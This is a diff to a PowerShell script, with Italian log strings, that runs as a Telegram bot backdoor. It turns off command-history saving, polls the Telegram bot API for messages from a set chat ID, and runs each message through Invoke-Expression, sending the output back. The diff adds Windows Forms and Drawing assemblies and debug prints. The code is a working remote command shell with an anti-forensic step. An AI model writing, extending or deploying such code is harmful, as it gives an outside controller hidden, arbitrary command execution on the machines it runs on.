@@ -3,6 +3,9 @@ Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
 $telegram_id, $api_token  = "@1", "@2"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
@@ -97,7 +100,7 @@ function SendMessage($output)
     Log "Procedo ad inviare il messaggio"
 
     # To escape _*``[\
-    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\\`$1"
+    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
 
     $MessageToSend = @{
         chat_id    = $telegram_id
@@ -209,12 +212,16 @@ function CommandListener
                         if ($user_id -match $telegram_id) {
                             if ($text.Length -gt 0) {
                                 try {
-                                    if (CheckRequiredParameters -CommandString $text) {
+                                    if (CheckRequiredParameters $text) {
+                                        Write-Host "1"
                                         $output = Invoke-Expression -Command $text | Out-String
+                                        Write-Host "2"
                                     } else {
+                                        Write-Host "3"
                                         continue
                                     }
                                 } catch {
+                                    Write-Host "4"
                                     $output = $Error[0] | Out-String
                                 }
         
